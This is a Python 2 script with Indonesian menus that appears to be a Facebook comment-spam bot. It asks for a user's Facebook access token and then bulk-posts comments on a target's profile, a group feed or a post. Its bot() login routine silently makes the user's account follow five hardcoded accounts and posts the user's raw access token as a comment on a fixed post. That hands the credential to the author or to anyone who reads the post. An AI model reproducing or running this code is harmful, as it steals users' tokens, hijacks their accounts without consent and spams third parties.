#!/usr/bin/python2
# coding=utf-8
# author : Fall Xavier

### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from datetime import datetime
from datetime import date

### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
komen = []
komengrup = []

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s
 ___________      __________ ___________________
 \_   _____/      \______   \\_____  \__    ___/
  |    __)  ______ |    |  _/ /   |   \|    |   
  |     \  /_____/ |    |   \/    |    \    |   
  \___  /          |______  /\_______  /____|   
      \/                  \/         \/          """%(N))
   
### BAGIAN LOGIN ###
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print(" %s[*] Author     : Fall Xavier Dominic Gremory XV."%(N))
		print(" [*] Github     : https://github.com/Fall-Xavier")
		print(" [*] ---------------------------------------------")
		print(" [*] Bergabung  : %s"%(tgl))
		print(" [*] Status     : %sPremium%s"%(H,N))
		print(" [*] ---------------------------------------------")
		print(" [*] IP         : %s"%(IP))
		token = raw_input('\n [?] masukan token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print(" %s[!] token kadaluwarsa!"%(M))
			sys.exit() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/100023812724814/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100026441864942/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100013775598620/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100004601539472/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100006033517423/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + token)

### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token kadaluwarsa!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))

    logo()
    print(" %s[*] Author    : Fall Xavier Dominic Gremory XV."%(N))
    print(" [*] Github    : https://github.com/Fall-Xavier")
    print(" [*] --------------------------------------------")
    print(" [*] Bergabung : %s"%(tgl))
    print(" [*] Status    : %sPremium%s"%(H,N))
    print(" [*] --------------------------------------------")
    print(" [*] IP        : %s"%(IP))
    print("\n [ selamat datang %s%s%s ]\n"%(K,nama,N))
    print(" [01]. bot komen profil")
    print(" [02]. bot komen grup")
    print(" [03]. bot komen target")
    print(" [%s00%s]. logout (hapus token)"%(M,N))
    asw = raw_input("\n [?] pilih menu : ")
    if asw == "":
    	menu()
    elif asw == "1":
    	profil()
    elif asw == "2":
    	grup()
    elif asw == "3":
    	target()
    elif asw == "0":
    	os.system('rm -f token.txt')
    	print(" [✓] berhasil menghapus token ")
    	exit()
    else:
    	print(" [!] pilih jawaban dengan bener ! ")
    	menu() 

#### BOT KOMEN PROFIL ####
def profil():
	try:
		toket=open('token.txt','r').read()
	except IOError:
		print("\n %s[!] token kadaluwarsa!"%(M))
		os.system('rm -rf token.txt')
		tokenz()
	print(" [*] harap gunakan '<>' untuk membuat baris baru")
	ide = raw_input(' [?] id target   : ')
	km = raw_input(' [?] komentar    : ')
	limit = raw_input(" [?] limit       : ")
	km=km.replace('<>','\n')
	try:
		p = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		print("\n [*] komentar anda sedang di proses...\n")
		for s in a['feed']['data']:
			f = s['id']
			komen.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print(' [✓] komentar '+H+''+km.replace('\n',' ')+''+N+' terkirim')
		print("\r [*] komentar selesai "+str(len(komen)))
		raw_input("\n [*] tekan enter untuk kembali ke menu ")
		menu()
	except KeyError:
		print(" [!] id tidak ditemukan!")
		raw_input("\n [*] tekan enter untuk kembali ke menu ")
		menu()

#### BOT KOMEN TARGET ####
def target():
	try:
		toket=open('token.txt','r').read()
	except IOError:
		print("\n %s[!] token kadaluwarsa!"%(M))
		os.system('rm -rf token.txt')
		tokenz()
	print(" [*] harap gunakan '<>' untuk membuat baris baru")
	ide = raw_input(' [?] id target   : ')
	idp = raw_input(' [?] id post     : ')
	km = raw_input(' [?] komentar    : ')
	limit = raw_input(" [?] limit       : ")
	km=km.replace('<>','\n')
	try:
		p = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		print("\n [*] komentar anda sedang di proses...\n")
		for s in a['feed']['data']:
			f = s['id']
			komen.append(idp)
			requests.post("https://graph.facebook.com/"+idp+"/comments?message="+km+"&access_token="+toket)
			print(' [✓] komentar '+H+''+km.replace('\n',' ')+''+N+' terkirim')
		print("\r [*] komentar selesai "+str(len(komen)))
		raw_input("\n [*] tekan enter untuk kembali ke menu ")
		menu()
	except KeyError:
		print(" [!] id tidak ditemukan!")
		raw_input("\n [*] tekan enter untuk kembali ke menu ")
		menu()

#### BOT KOMEN GRUP ####
def grup():
	try:
		toket=open('token.txt','r').read()
	except IOError:
		print("\n %s[!] token kadaluwarsa!"%(M))
		os.system('rm -rf token.txt')
		tokenz()
	print(" [*] harap gunakan '<>' untuk membuat baris baru")
	ide = raw_input(' [?] id grup     : ')
	km = raw_input(' [?] komentar    : ')
	limit = raw_input(" [?] limit       : ")
	km=km.replace('<>','\n')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
	except KeyError:
		print(" [!] grup tidak ditemukan!")
		raw_input("\n [*] tekan enter untuk kembali ke menu ")
		menu()
	try:
		p = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		print("\n [*] komentar anda sedang di proses...\n")
		for s in a['feed']['data']:
			f = s['id']
			komengrup.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print(' [✓] komentar '+H+''+km.replace('\n',' ')+''+N+' terkirim')
		print("\r [*] komentar selesai "+str(len(komengrup)))
		raw_input("\n [*] tekan enter untuk kembali ke menu ")
		menu()
	except KeyError:
		print(" [!] grup tidak ditemukan!")
		raw_input("\n [*] tekan enter untuk kembali ke menu ")
		menu()
		
if __name__ == '__main__':
	menu()
